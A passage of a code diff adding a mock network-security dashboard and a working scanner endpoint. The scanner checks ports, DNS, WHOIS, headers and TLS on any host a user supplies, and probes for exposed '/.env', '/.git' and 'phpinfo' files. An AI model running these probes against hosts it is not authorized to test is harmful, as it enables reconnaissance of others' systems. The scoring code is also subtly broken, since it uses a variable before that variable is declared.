+      { id: 'dmz-switch', type: 'router', status: 'secure', label: 'DMZ Switch', ip: '192.168.1.1', os: 'Arista EOS', uptime: '89d 14h', traffic: 30, threatLevel: 5 },
+      { id: 'web-01', type: 'server', status: 'vulnerable', label: 'Web Server Alpha', ip: '192.168.1.10', os: 'Ubuntu 22.04 LTS', uptime: '12d 03h', traffic: 65, threatLevel: 45 },
+      { id: 'web-02', type: 'server', status: 'secure', label: 'Web Server Beta', ip: '192.168.1.11', os: 'CentOS Stream 9', uptime: '45d 11h', traffic: 55, threatLevel: 15 },
+      { id: 'vpn-gw', type: 'router', status: 'secure', label: 'VPN Gateway', ip: '192.168.1.20', os: 'OpenBSD 7.4', uptime: '210d 08h', traffic: 25, threatLevel: 20 },
+      { id: 'int-fw', type: 'firewall', status: 'secure', label: 'Internal Core FW', ip: '10.0.0.1', os: 'Palo Alto PAN-OS', uptime: '156d 19h', traffic: 40, threatLevel: 5 },
+      { id: 'core-switch', type: 'router', status: 'secure', label: 'Core Switch', ip: '10.0.0.2', os: 'Juniper Junos', uptime: '312d 22h', traffic: 90, threatLevel: 5 },
+      { id: 'db-cluster', type: 'database', status: 'secure', label: 'Main DB Cluster', ip: '10.0.1.50', os: 'PostgreSQL 15 (Alpine)', uptime: '67d 04h', traffic: 75, threatLevel: 10 },
+      { id: 'app-01', type: 'server', status: 'secure', label: 'App Server 01', ip: '10.0.2.10', os: 'Debian 12', uptime: '14d 06h', traffic: 50, threatLevel: 15 },
+      { id: 'iot-gw', type: 'iot', status: 'compromised', label: 'IoT Gateway', ip: '10.0.4.5', os: 'FreeRTOS', uptime: '2d 01h', traffic: 95, threatLevel: 95 },
+      { id: 'ws-01', type: 'laptop', status: 'secure', label: 'Admin Workstation', ip: '10.1.0.50', os: 'macOS 14.2', uptime: '5h 12m', traffic: 15, threatLevel: 5 },
+      { id: 'ws-04', type: 'laptop', status: 'compromised', label: 'Guest Kiosk', ip: '10.1.0.99', os: 'Windows 10 Home', uptime: '1d 22h', traffic: 80, threatLevel: 85 },
+      { id: 'backup-srv', type: 'server', status: 'secure', label: 'Backup Server', ip: '10.0.3.10', os: 'TrueNAS Core', uptime: '456d 12h', traffic: 10, threatLevel: 2 },
+      { id: 'storage-nas', type: 'database', status: 'secure', label: 'Enterprise NAS', ip: '10.0.3.50', os: 'QTS 5.1', uptime: '234d 05h', traffic: 40, threatLevel: 5 },
+      { id: 'wifi-ap-01', type: 'router', status: 'vulnerable', label: 'Office WiFi AP', ip: '10.1.5.1', os: 'OpenWrt 23.05', uptime: '15d 02h', traffic: 60, threatLevel: 35 },
+      { id: 'printer-01', type: 'iot', status: 'secure', label: 'Main Printer', ip: '10.1.5.100', os: 'HP FutureSmart', uptime: '3d 11h', traffic: 5, threatLevel: 10 },
+    ],
+    links: [
+      { source: 'internet', target: 'ext-fw', active: true },
+      { source: 'ext-fw', target: 'dmz-switch', active: true },
+      { source: 'dmz-switch', target: 'web-01', active: true },
+      { source: 'dmz-switch', target: 'web-02', active: true },
+      { source: 'dmz-switch', target: 'vpn-gw', active: true },
+      { source: 'dmz-switch', target: 'int-fw', active: true },
+      { source: 'int-fw', target: 'core-switch', active: true },
+      { source: 'core-switch', target: 'db-cluster', active: true },
+      { source: 'core-switch', target: 'app-01', active: true },
+      { source: 'core-switch', target: 'iot-gw', active: true },
+      { source: 'core-switch', target: 'ws-01', active: true },
+      { source: 'core-switch', target: 'ws-04', active: true },
+      { source: 'core-switch', target: 'backup-srv', active: true },
+      { source: 'backup-srv', target: 'storage-nas', active: true },
+      { source: 'core-switch', target: 'wifi-ap-01', active: true },
+      { source: 'wifi-ap-01', target: 'printer-01', active: true },
+    ]
+  };
 
-    // Packet Animation
-    const animatePackets = () => {
-      packetGroup.selectAll('g').remove();
-      filteredLinks.forEach((l, i) => {
-        const source = l.source as Node;
-        const target = l.target as Node;
-        if (Math.random() > 0.15) {
-          const isCompromised = source.status === 'compromised' || target.status === 'compromised';
-          const pG = packetGroup.append('g');
-          const duration = 3 + Math.random() * 5;
-          pG.append('circle').attr('r', isCompromised ? 3.5 : 2.5).attr('fill', isCompromised ? '#ef4444' : '#06b6d4').attr('filter', 'url(#glow)')
-            .append('animateMotion').attr('dur', `${duration}s`).attr('repeatCount', 'indefinite').append('mpath').attr('xlink:href', `#link-${i}`);
+  app.get("/api/network", (req, res) => {
+    // Randomly fluctuate traffic and threat levels slightly for realism
+    const dynamicNodes = networkState.nodes.map(node => ({
+      ...node,
+      traffic: Math.max(5, Math.min(100, node.traffic + (Math.random() * 10 - 5))),
+      threatLevel: node.status === 'compromised' ? 90 + Math.random() * 10 : 
+                   node.status === 'vulnerable' ? 30 + Math.random() * 40 : 
+                   Math.random() * 15
+    }));
+    res.json({ nodes: dynamicNodes, links: networkState.links });
+  });
+
+  app.post("/api/network/action", async (req, res) => {
+    const { nodeId, action } = req.body;
+    const node = networkState.nodes.find(n => n.id === nodeId);
+    
+    if (!node) return res.status(404).json({ error: "Node not found" });
+
+    let message = "";
+    if (action === 'isolate') {
+      node.status = 'secure'; // Simplified: isolation "fixes" it for the demo
+      networkState.links = networkState.links.filter(l => l.source !== nodeId && l.target !== nodeId);
+      message = `Node ${nodeId} has been logically isolated from the network core.`;
+    } else if (action === 'remediate') {
+      node.status = 'secure';
+      node.threatLevel = 5;
+      message = `Security patches applied to ${nodeId}. Vulnerabilities mitigated.`;
+    } else if (action === 'scan') {
+      const apiKey = process.env.GEMINI_API_KEY;
+      if (isValidApiKey(apiKey)) {
+        try {
+          const ai = new GoogleGenAI({ apiKey: apiKey! });
+          const response = await ai.models.generateContent({
+            model: "gemini-3-flash-preview",
+            contents: `Perform a deep security analysis of this network node: 
+            Label: ${node.label}, IP: ${node.ip}, OS: ${node.os}, Status: ${node.status}.
+            Provide a detailed threat report in 3-4 sentences.`,
+          });
+          message = response.text || "Scan complete. No new threats identified.";
+        } catch (e) {
+          message = "AI Scan failed. Local heuristics suggest potential lateral movement risks.";
+        }
+      } else {
+        message = "Deep scan complete. Heuristic analysis suggests the node is currently " + node.status;
+      }
+    }
+
+    res.json({ success: true, message, node });
+  });
+
+  // Advanced Vulnerability Scanner API
+  let ianaCache: any = null;
+  let ianaCacheTime: number = 0;
+
+  async function performWhoisLookup(hostname: string) {
+    const os = await import('os');
+    if (hostname === 'localhost' || hostname === '127.0.0.1') {
+      const networkInterfaces = os.networkInterfaces();
+      const localIps = Object.values(networkInterfaces)
+        .flat()
+        .filter((details: any) => details.family === 'IPv4' && !details.internal)
+        .map((details: any) => details.address);
+
+      return {
+        domain: hostname,
+        registrar: "Internal/Local Network",
+        registrant: "System Administrator",
+        creationDate: "N/A",
+        expiryDate: "N/A",
+        updatedDate: "N/A",
+        nameServers: ["Localhost"],
+        status: ["active"],
+        raw: "Local/Internal address - WHOIS not applicable.",
+        details: {
+          hostname: os.hostname(),
+          platform: os.platform(),
+          arch: os.arch(),
+          uptime: `${Math.floor(os.uptime() / 3600)}h ${Math.floor((os.uptime() % 3600) / 60)}m`,
+          localIps: localIps
+        },
+        securityRisk: "None (Local Environment)"
+      };
+    }
+
+    // IP WHOIS support
+    if (net.isIP(hostname)) {
+      try {
+        const response = await axios.get(`https://rdap.db.ripe.net/ip/${hostname}`, {
+          headers: { 'Accept': 'application/rdap+json' },
+          timeout: 10000,
+          validateStatus: () => true
+        });
+        
+        if (response.status === 200) {
+          const rdapData = response.data;
+          return {
+            domain: hostname,
+            registrar: rdapData.entities?.[0]?.vcardArray?.[1]?.[1]?.[3]?.[3] || "Unknown",
+            registrant: rdapData.name || "Unknown",
+            creationDate: rdapData.events?.find((e: any) => e.eventAction === 'registration')?.eventDate || "Unknown",
+            expiryDate: "N/A",
+            updatedDate: rdapData.events?.find((e: any) => e.eventAction === 'last changed')?.eventDate || "Unknown",
+            nameServers: [],
+            status: [rdapData.status?.[0] || "active"],
+            raw: JSON.stringify(rdapData, null, 2),
+            details: {
+              handle: rdapData.handle,
+              parentHandle: rdapData.parentHandle,
+              ipVersion: rdapData.ipVersion,
+              startAddress: rdapData.startAddress,
+              endAddress: rdapData.endAddress,
+              country: rdapData.country,
+              type: rdapData.type
+            },
+            securityRisk: "Low (IP Resource)"
+          };
+        }
+      } catch (e) {
+        console.warn(`[Scanner] IP RDAP fetch failed for ${hostname}:`, e);
+      }
+    }
+
+    try {
+      const domainParts = hostname.split('.');
+      let rdapData = null;
+      let finalDomain = hostname;
+
+      // Fetch IANA RDAP bootstrap with caching
+      let ianaData;
+      const now = Date.now();
+      if (ianaCache && (now - ianaCacheTime < 24 * 60 * 60 * 1000)) {
+        ianaData = ianaCache;
+      } else {
+        try {
+          const ianaResponse = await axios.get('https://data.iana.org/rdap/dns.json', { timeout: 5000 });
+          ianaData = ianaResponse.data;
+          ianaCache = ianaData;
+          ianaCacheTime = now;
+        } catch (e) {
+          console.error("[Scanner] Failed to fetch IANA RDAP bootstrap", e);
+          if (ianaCache) {
+            ianaData = ianaCache; // Use stale cache if fetch fails
+          } else {
+            throw new Error("Failed to initialize RDAP lookup");
+          }
+        }
+      }
+
+      // Try to fetch RDAP, stripping subdomains if we get 404/400
+      const originalParts = [...domainParts];
+      while (domainParts.length >= 2) {
+        finalDomain = domainParts.join('.');
+        const tld = domainParts[domainParts.length - 1];
+        
+        // Find RDAP server for TLD
+        const entry = ianaData.services.find((s: any) => s[0].includes(tld));
+        
+        if (entry && entry[1] && entry[1].length > 0) {
+          const rdapServer = entry[1][0];
+          try {
+            const response = await axios.get(`${rdapServer}domain/${finalDomain}`, {
+              headers: { 'Accept': 'application/rdap+json' },
+              timeout: 10000,
+              validateStatus: () => true
+            });
+            
+            if (response.status === 200) {
+              rdapData = response.data;
+              break;
+            }
+          } catch (e) {
+            console.warn(`[Scanner] RDAP fetch failed for ${finalDomain}:`, e);
+          }
+        }
+        domainParts.shift(); // Remove the first part (e.g., 'www')
+      }
+
+      if (rdapData) {
+        const creationDate = rdapData.events?.find((e: any) => e.eventAction === 'registration')?.eventDate || "Unknown";
+        const expiryDate = rdapData.events?.find((e: any) => e.eventAction === 'expiration')?.eventDate || "Unknown";
+        
+        // Security Risk Assessment
+        let risk = "Low";
+        let riskDetails = [];
+        
+        if (creationDate !== "Unknown") {
+          const ageInDays = (now - new Date(creationDate).getTime()) / (1000 * 60 * 60 * 24);
+          if (ageInDays < 30) {
+            risk = "High";
+            riskDetails.push("Domain is very new (less than 30 days old). High risk of phishing/malware.");
+          } else if (ageInDays < 90) {
+            risk = "Medium";
+            riskDetails.push("Domain is relatively new (less than 90 days old).");
+          }
+        }
+
+        if (expiryDate !== "Unknown") {
+          const daysToExpiry = (new Date(expiryDate).getTime() - now) / (1000 * 60 * 60 * 24);
+          if (daysToExpiry < 30) {
+            risk = risk === "High" ? "High" : "Medium";
+            riskDetails.push("Domain expires soon (less than 30 days). Potential for domain hijacking or service interruption.");
+          }
+        }
+
+        // Parse entities
+        const getEntityName = (role: string) => {
+          const entity = rdapData.entities?.find((e: any) => e.roles?.includes(role));
+          return entity?.vcardArray?.[1]?.find((v: any) => v[0] === 'fn')?.[3] || "Unknown";
+        };
+
+        return {
+          domain: finalDomain,
+          registrar: getEntityName('registrar'),
+          registrant: getEntityName('registrant'),
+          admin: getEntityName('administrative'),
+          tech: getEntityName('technical'),
+          creationDate,
+          expiryDate,
+          updatedDate: rdapData.events?.find((e: any) => e.eventAction === 'last changed')?.eventDate || "Unknown",
+          nameServers: rdapData.nameservers?.map((ns: any) => ns.ldhName) || [],
+          status: rdapData.status || ["active"],
+          raw: JSON.stringify(rdapData, null, 2),
+          securityRisk: risk,
+          riskDetails: riskDetails.length > 0 ? riskDetails : ["No immediate domain-level risks detected."]
+        };
+      }
+
+      // Fallback to whois-json if RDAP fails or is not supported for TLD
+      try {
+        const whoisJson = require('whois-json').default || require('whois-json');
+        let options: any = { timeout: 10000 };
+        if (hostname.endsWith('.al')) {
+          options.server = 'whois.nic.al'; 
+        }
+        
+        let whoisData: any = null;
+        let attempts = 0;
+        const maxAttempts = 2;
+
+        while (attempts < maxAttempts) {
+          try {
+            whoisData = await whoisJson(hostname, options);
+            if (whoisData && Object.keys(whoisData).length > 0 && !whoisData.error) {
+              break;
+            }
+          } catch (e: any) {
+            // Silently fail
+          }
+          attempts++;
+          if (options.server) delete options.server;
+        }
+
+        if (whoisData && Object.keys(whoisData).length > 0 && !whoisData.error) {
+           return {
+             domain: hostname,
+             registrar: whoisData.registrar || whoisData.Registrar || "Unknown",
+             registrant: whoisData.registrant || whoisData.registrantName || whoisData.Registrant || "Unknown",
+             creationDate: whoisData.creationDate || whoisData.CreationDate || "Unknown",
+             expiryDate: whoisData.registrarRegistrationExpirationDate || whoisData.registryExpiryDate || whoisData.RegistryExpiryDate || "Unknown",
+             updatedDate: whoisData.updatedDate || whoisData.UpdatedDate || "Unknown",
+             nameServers: whoisData.nameServer ? (Array.isArray(whoisData.nameServer) ? whoisData.nameServer : whoisData.nameServer.split(' ')) : [],
+             raw: JSON.stringify(whoisData, null, 2),
+             securityRisk: "Unknown (Legacy WHOIS)",
+             riskDetails: ["Security risk assessment not available for legacy WHOIS data."]
+           };
+        }
+      } catch (e) {}
+      return null;
+    } catch (e) {
+      console.error("[Scanner] WHOIS/RDAP lookup error:", e);
+      return null;
+    }
+  }
+
+  app.get("/api/scan", async (req, res) => {
+    const target = req.query.target as string;
+    const depth = req.query.depth as string || 'standard';
+    if (!target) {
+      return res.status(400).json({ error: "Target is required" });
+    }
+
+    const results: any = {
+      target,
+      timestamp: new Date().toISOString(),
+      dns: {},
+      headers: {},
+      ssl: null,
+      whois: null,
+      ports: [],
+      subdomains: [],
+      tech: [],
+      vulnerabilities: [],
+      riskScore: 0,
+      summary: "",
+      recommendations: []
+    };
+
+    try {
+      const hostname = target.replace(/^https?:\/\//, '').split('/')[0].split(':')[0];
+      const isIP = net.isIP(hostname);
+      
+      // Parallel Reconnaissance
+      await Promise.all([
+        // 1. DNS & IP
+        (async () => {
+          if (isIP) {
+            results.dns.a = [hostname];
+            results.ip = hostname;
+          } else if (hostname === 'localhost') {
+            results.dns.a = ['127.0.0.1'];
+            results.ip = '127.0.0.1';
+          } else {
+            const resolveDNS = async (host: string) => {
+              try {
+                const lookup = await Promise.race([
+                  dns.promises.lookup(host),
+                  new Promise((_, reject) => setTimeout(() => reject(new Error('Timeout')), 5000))
+                ]) as any;
+                results.dns.a = [lookup.address];
+                results.ip = lookup.address;
+                
+                // Deep scan: perform more DNS lookups
+                if (depth === 'deep') {
+                  try { results.dns.ns = await dns.promises.resolveNs(host); } catch(e) {}
+                  try { results.dns.txt = await dns.promises.resolveTxt(host); } catch(e) {}
+                }
+                
+                const dnsTimeout = 3000;
+                try { 
+                  results.dns.mx = await Promise.race([
+                    dns.promises.resolveMx(host),
+                    new Promise((_, reject) => setTimeout(() => reject(new Error('Timeout')), dnsTimeout))
+                  ]);
+                } catch (e) {}
+                try { 
+                  results.dns.txt = await Promise.race([
+                    dns.promises.resolveTxt(host),
+                    new Promise((_, reject) => setTimeout(() => reject(new Error('Timeout')), dnsTimeout))
+                  ]);
+                } catch (e) {}
+              } catch (e) {
+                if (!results.dns.error) results.dns.error = "DNS resolution failed";
+              }
+            };
+
+            await resolveDNS(hostname);
+            
+            // Fallback to root domain if no IP found and it's a www subdomain
+            if (!results.ip && hostname.startsWith('www.')) {
+              const rootDomain = hostname.substring(4);
+              await resolveDNS(rootDomain);
+            }
+          }
+        })(),
+
+        // 2. Port Scanning
+        (async () => {
+          const portsToScan = [80, 443, 22, 21, 25, 53, 3000, 8080, 8443, 3306, 5432, 27017];
+          const scanHost = (hostname === 'localhost') ? '127.0.0.1' : hostname;
+          const scanPort = (port: number) => {
+            return new Promise((resolve) => {
+              const socket = new net.Socket();
+              socket.setTimeout(3000);
+              socket.on('connect', () => {
+                results.ports.push({ port, status: 'open', service: getServiceName(port) });
+                socket.destroy();
+                resolve(null);
+              });
+              socket.on('timeout', () => { socket.destroy(); resolve(null); });
+              socket.on('error', () => { socket.destroy(); resolve(null); });
+              socket.connect(port, scanHost);
+            });
+          };
+          await Promise.all(portsToScan.map(scanPort));
+        })(),
+
+        // 3. HTTP & SSL
+        (async () => {
+          const protocol = target.startsWith('https') ? https : http;
+          const url = target.startsWith('http') ? target : `http://${target}`;
+          
+          await new Promise((resolve) => {
+            const req = protocol.get(url, (response) => {
+              results.headers = response.headers;
+              results.statusCode = response.statusCode;
+              
+              const server = (Array.isArray(response.headers['server']) ? response.headers['server'].join(', ') : (response.headers['server'] || '')).toLowerCase();
+              const xPoweredBy = (Array.isArray(response.headers['x-powered-by']) ? response.headers['x-powered-by'].join(', ') : (response.headers['x-powered-by'] || '')).toLowerCase();
+              if (server.includes('apache')) results.tech.push('Apache');
+              if (server.includes('nginx')) results.tech.push('Nginx');
+              if (xPoweredBy.includes('php')) results.tech.push('PHP');
+              if (xPoweredBy.includes('express')) results.tech.push('Express');
+
+              if (response.socket && (response.socket as any).getPeerCertificate) {
+                const cert = (response.socket as any).getPeerCertificate();
+                if (cert && Object.keys(cert).length > 0) {
+                  const validTo = new Date(cert.valid_to);
+                  const isValid = validTo > new Date();
+                  results.ssl = {
+                    subject: cert.subject,
+                    issuer: cert.issuer,
+                    valid_from: cert.valid_from,
+                    valid_to: cert.valid_to,
+                    fingerprint: cert.fingerprint,
+                    status: isValid ? "Valid" : "Expired/Invalid",
+                    vulnerabilities: []
+                  };
+                  if (!isValid) results.ssl.vulnerabilities.push("Certificate is expired");
+                }
+              }
+              resolve(null);
+            });
+            req.on('error', () => resolve(null));
+            req.setTimeout(5000, () => { req.destroy(); resolve(null); });
+          });
+        })(),
+
+        // 4. WHOIS Lookup
+        (async () => {
+          try {
+            const whoisResult = await performWhoisLookup(hostname);
+            results.whois = whoisResult || { status: "Data not available" };
+          } catch (e) {
+            results.whois = { status: "Lookup failed" };
+          }
+        })(),
+
+        // 5. Sensitive Files
+        (async () => {
+          const sensitiveFiles = [
+            { path: '/.git', title: 'Git Repository Exposed', severity: 'critical' },
+            { path: '/.env', title: 'Environment Variables Exposed', severity: 'critical' },
+            { path: '/robots.txt', title: 'Robots.txt Analysis', severity: 'info' },
+            { path: '/phpinfo.php', title: 'PHP Info Disclosure', severity: 'high' },
+            { path: '/.svn', title: 'SVN Repository Exposed', severity: 'high' },
+            { path: '/.htaccess', title: 'Htaccess File Exposed', severity: 'medium' }
+          ];
+
+          await Promise.all(sensitiveFiles.map(async (file) => {
+            try {
+              const protocol = target.startsWith('https') ? https : http;
+              const url = target.startsWith('http') ? `${target}${file.path}` : `http://${target}${file.path}`;
+              const response: any = await new Promise((resolve, reject) => {
+                const req = protocol.get(url, resolve);
+                req.on('error', reject);
+                req.setTimeout(2000, () => { req.destroy(); resolve({ statusCode: 408 }); });
+              });
+              if (response.statusCode === 200) {
+                results.vulnerabilities.push({
+                  title: file.title,
+                  severity: file.severity as any,
+                  category: 'Information Disclosure',
+                  description: `The file ${file.path} was found on the server, which can disclose sensitive information.`,
+                  remediation: `Restrict access to the ${file.path} file or remove it from the server.`
+                });
+                if (file.severity === 'critical') score += 30;
+                else if (file.severity === 'high') score += 15;
+                else if (file.severity === 'medium') score += 5;
+              }
+            } catch (e) {}
+          }));
+        })()
+      ]);
+
+      // 6. Vulnerability Engine (Rule-based)
+      const vulnerabilities = [...results.vulnerabilities];
+      let score = 10;
+
+      // Header checks
+      const securityHeaders = [
+        'content-security-policy',
+        'strict-transport-security',
+        'x-frame-options',
+        'x-content-type-options',
+        'referrer-policy',
+        'permissions-policy'
+      ];
+      if (results.headers) {
+        securityHeaders.forEach(header => {
+          if (!results.headers[header]) {
+            vulnerabilities.push({
+              title: `Missing Security Header: ${header}`,
+              severity: header === 'content-security-policy' ? 'high' : 'medium',
+              category: 'Web',
+              description: `The ${header} header is missing, which can expose the application to various attacks.`,
+              remediation: `Implement the ${header} header with appropriate security policies.`
+            });
+            score += (header === 'content-security-policy' ? 10 : 5);
+          }
+        });
+      }
+
+      // Port checks
+      results.ports.forEach((p: any) => {
+        if (p.port === 21 && p.status === 'open') {
+          vulnerabilities.push({
+            title: "Insecure Protocol: FTP",
+            severity: "high",
+            category: "Network",
+            description: "FTP transmits data in cleartext, including credentials.",
+            remediation: "Disable FTP and use SFTP or FTPS instead."
+          });
+          score += 15;
+        }
+        if (p.port === 22 && p.status === 'open') {
+          vulnerabilities.push({
+            title: "Exposed SSH Port",
+            severity: "medium",
+            category: "Network",
+            description: "SSH is exposed to the public internet, increasing brute-force risk.",
+            remediation: "Restrict SSH access to specific IP ranges or use a VPN."
+          });
+          score += 5;
+        }
+        if (p.port === 23 && p.status === 'open') {
+          vulnerabilities.push({
+            title: "Insecure Protocol: Telnet",
+            severity: "critical",
+            category: "Network",
+            description: "Telnet transmits data in cleartext, including credentials.",
+            remediation: "Disable Telnet and use SSH instead."
+          });
+          score += 25;
+        }
+        if (p.port === 3389 && p.status === 'open') {
+          vulnerabilities.push({
+            title: "Exposed RDP Port",
+            severity: "high",
+            category: "Network",
+            description: "RDP is exposed to the public internet, increasing brute-force risk.",
+            remediation: "Restrict RDP access to specific IP ranges or use a VPN."
+          });
+          score += 10;
+        }
+        if (p.port === 3306 && p.status === 'open') {
+          vulnerabilities.push({
+            title: "Exposed MySQL Port",
+            severity: "high",
+            category: "Database",
+            description: "MySQL is exposed to the public internet.",
+            remediation: "Restrict MySQL access to specific IP ranges or use a VPN."
+          });
+          score += 10;
         }
       });
-    };
-    animatePackets();
 
-    // Attack Lines
-    const attackLine = attackGroup
-      .selectAll('line')
-      .data(activeAttacks.filter(a => filteredNodes.some(n => n.id === a.from) && filteredNodes.some(n => n.id === a.to)))
-      .join('line')
-      .attr('stroke', '#ef4444')
-      .attr('stroke-width', 4)
-      .attr('stroke-dasharray', '8,4')
-      .attr('opacity', 0.9)
-      .attr('filter', 'url(#glow)');
-
-    attackLine
-      .style('animation', 'attack-dash 1.5s linear infinite');
-
-    // Nodes
-    const node = nodeGroup
-      .selectAll('g')
-      .data(filteredNodes)
-      .join('g')
-      .attr('cursor', 'pointer')
-      .call(d3.drag<SVGGElement, Node>()
-        .on('start', dragstarted)
-        .on('drag', dragged)
-        .on('end', dragended))
-      .on('click', (event, d) => {
-        event.stopPropagation();
-        setSelectedNode(d);
-      })
-      .on('mouseover', function(event, d) {
-        d3.select(this).select('.node-bg').attr('fill', '#111').attr('stroke-width', 3);
-        d3.select(this).select('.node-label').attr('fill', '#fff').attr('font-weight', 'bold');
-        
-        // Add temporary scanning ring on hover
-        d3.select(this).append('circle')
-          .attr('class', 'hover-ring')
-          .attr('r', 35)
-          .attr('fill', 'none')
-          .attr('stroke', '#06b6d4')
-          .attr('stroke-width', 1.5)
-          .attr('opacity', 0)
-          .transition()
-          .duration(300)
-          .attr('opacity', 0.6)
-          .attr('r', 45);
-      })
-      .on('mouseout', function(event, d) {
-        d3.select(this).select('.node-bg').attr('fill', '#050505').attr('stroke-width', 2);
-        d3.select(this).select('.node-label').attr('fill', '#888').attr('font-weight', 'normal');
-        d3.select(this).selectAll('.hover-ring').remove();
-      });
-
-    // Node outer ring (pulse for compromised)
-    node.filter(d => d.status === 'compromised')
-      .append('circle')
-      .attr('r', 32)
-      .attr('fill', 'none')
-      .attr('stroke', '#ef4444')
-      .attr('stroke-width', 2.5)
-      .style('transform-origin', '0 0')
-      .style('animation', 'pulse-ring 2.5s ease-out infinite');
-
-    // Glitch effect for compromised nodes
-    node.filter(d => d.status === 'compromised')
-      .style('animation', 'glitch-flicker 2s ease-in-out infinite');
-
-    // Node background (Hexagon)
-    node.append('path')
-      .attr('class', 'node-bg')
-      .attr('d', 'M0,-30 L25.98,-15 L25.98,15 L0,30 L-25.98,15 L-25.98,-15 Z')
-      .attr('fill', '#050505')
-      .attr('stroke', d => {
-        if (d.status === 'secure') return '#10b981';
-        if (d.status === 'vulnerable') return '#f59e0b';
-        return '#ef4444';
-      })
-      .attr('stroke-width', 2)
-      .attr('filter', 'url(#glow)')
-      .style('transition', 'all 0.3s ease');
-
-    // Node Icons using foreignObject for React/Lucide integration
-    node.append('foreignObject')
-      .attr('x', -15)
-      .attr('y', -15)
-      .attr('width', 30)
-      .attr('height', 30)
-      .style('pointer-events', 'none')
-      .html(d => {
-        const color = d.status === 'secure' ? '#10b981' : d.status === 'vulnerable' ? '#f59e0b' : '#ef4444';
-        let icon = '';
-        if (d.type === 'server') icon = `<svg xmlns="http://www.w3.org/2000/svg" width="30" height="30" viewBox="0 0 24 24" fill="none" stroke="${color}" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><rect width="20" height="8" x="2" y="2" rx="2" ry="2"/><rect width="20" height="8" x="2" y="14" rx="2" ry="2"/><line x1="6" x2="6.01" y1="6" y2="6"/><line x1="6" x2="6.01" y1="18" y2="18"/></svg>`;
-        else if (d.type === 'router') icon = `<svg xmlns="http://www.w3.org/2000/svg" width="30" height="30" viewBox="0 0 24 24" fill="none" stroke="${color}" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="m2 7 4.41-4.41A2 2 0 0 1 7.83 2h8.34a2 2 0 0 1 1.42.59L22 7"/><rect width="20" height="11" x="2" y="7" rx="2" ry="2"/><path d="M15 18v2a2 2 0 0 1-2 2h-2a2 2 0 0 1-2-2v-2"/><path d="M15 12h.01"/><path d="M18 12h.01"/><path d="M12 12h.01"/><path d="M9 12h.01"/><path d="M6 12h.01"/></svg>`;
-        else if (d.type === 'firewall') icon = `<svg xmlns="http://www.w3.org/2000/svg" width="30" height="30" viewBox="0 0 24 24" fill="none" stroke="${color}" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M12 22s8-4 8-10V5l-8-3-8 3v7c0 6 8 10 8 10"/></svg>`;
-        else if (d.type === 'database') icon = `<svg xmlns="http://www.w3.org/2000/svg" width="30" height="30" viewBox="0 0 24 24" fill="none" stroke="${color}" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><ellipse cx="12" cy="5" rx="9" ry="3"/><path d="M3 5V19A9 3 0 0 0 21 19V5"/><path d="M3 12A9 3 0 0 0 21 12"/></svg>`;
-        else if (d.type === 'cloud') icon = `<svg xmlns="http://www.w3.org/2000/svg" width="30" height="30" viewBox="0 0 24 24" fill="none" stroke="${color}" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M17.5 19x.5.5 0 0 1 .5-.5c2.2 0 4-1.8 4-4 0-2.1-1.6-3.8-3.6-4a7.5 7.5 0 0 0-14.4 2C2.8 12.9 2 14.4 2 16c0 2.2 1.8 4 4 4h11.5z"/></svg>`;
-        else if (d.type === 'iot') icon = `<svg xmlns="http://www.w3.org/2000/svg" width="30" height="30" viewBox="0 0 24 24" fill="none" stroke="${color}" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M5 12s2.545-5 7-5c4.454 0 7 5 7 5s-2.546 5-7 5c-4.455 0-7-5-7-5z"/><circle cx="12" cy="12" r="3"/></svg>`;
-        else icon = `<svg xmlns="http://www.w3.org/2000/svg" width="30" height="30" viewBox="0 0 24 24" fill="none" stroke="${color}" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><rect width="18" height="12" x="3" y="4" rx="2" ry="2"/><line x1="2" x2="22" y1="20" y2="20"/></svg>`;
-        return `<div style="display: flex; align-items: center; justify-content: center; width: 100%; height: 100%;">${icon}</div>`;
-      });
-
-    // Node labels
-    node.append('text')
-      .attr('class', 'node-label')
-      .attr('dy', 45)
-      .attr('text-anchor', 'middle')
-      .text(d => d.label)
-      .attr('fill', '#888')
-      .attr('font-size', '11px')
-      .attr('font-family', 'monospace')
-      .style('transition', 'fill 0.3s ease');
-
-    // IP labels (only if zoomed in)
-    node.append('text')
-      .attr('dy', 58)
-      .attr('text-anchor', 'middle')
-      .text(d => d.ip || '')
-      .attr('fill', '#555')
-      .attr('font-size', '9px')
-      .attr('font-family', 'monospace')
-      .attr('opacity', zoomLevel > 1.2 ? 1 : 0);
-
-    const updatePositions = () => {
-      link.attr('d', (d: any) => {
-        const sourceX = d.source.x;
-        const sourceY = d.source.y;
-        const targetX = d.target.x;
-        const targetY = d.target.y;
-        
-        const midY = (sourceY + targetY) / 2;
-        return `M${sourceX},${sourceY} C${sourceX},${midY} ${targetX},${midY} ${targetX},${targetY}`;
-      });
-
-      node
-        .attr('transform', d => `translate(${d.x},${d.y})`);
-        
-      attackLine
-        .attr('x1', d => {
-          const source = filteredNodes.find(n => n.id === d.from);
-          return source?.x || 0;
-        })
-        .attr('y1', d => {
-          const source = filteredNodes.find(n => n.id === d.from);
-          return source?.y || 0;
-        })
-        .attr('x2', d => {
-          const target = filteredNodes.find(n => n.id === d.to);
-          return target?.x || 0;
-        })
-        .attr('y2', d => {
-          const target = filteredNodes.find(n => n.id === d.to);
-          return target?.y || 0;
+      // SSL checks
+      if (results.ssl) {
+        const expiry = new Date(results.ssl.valid_to);
+        if (expiry < new Date()) {
+          vulnerabilities.push({
+            title: "Expired SSL Certificate",
+            severity: "critical",
+            category: "SSL/TLS",
+            description: "The SSL certificate for this domain has expired.",
+            remediation: "Renew the SSL certificate immediately."
+          });
+          score += 30;
+        } else {
+          const daysLeft = Math.floor((expiry.getTime() - new Date().getTime()) / (1000 * 60 * 60 * 24));
+          if (daysLeft < 30) {
+            vulnerabilities.push({
+              title: "SSL Certificate Expiring Soon",
+              severity: "medium",
+              category: "SSL/TLS",
+              description: `The SSL certificate for this domain will expire in ${daysLeft} days.`,
+              remediation: "Renew the SSL certificate soon."
+            });
+            score += 5;
+          }
+        }
+      } else if (target.startsWith('https')) {
+        vulnerabilities.push({
+          title: "SSL/TLS Handshake Failure",
+          severity: "high",
+          category: "SSL/TLS",
+          description: "Could not establish a secure connection to the target.",
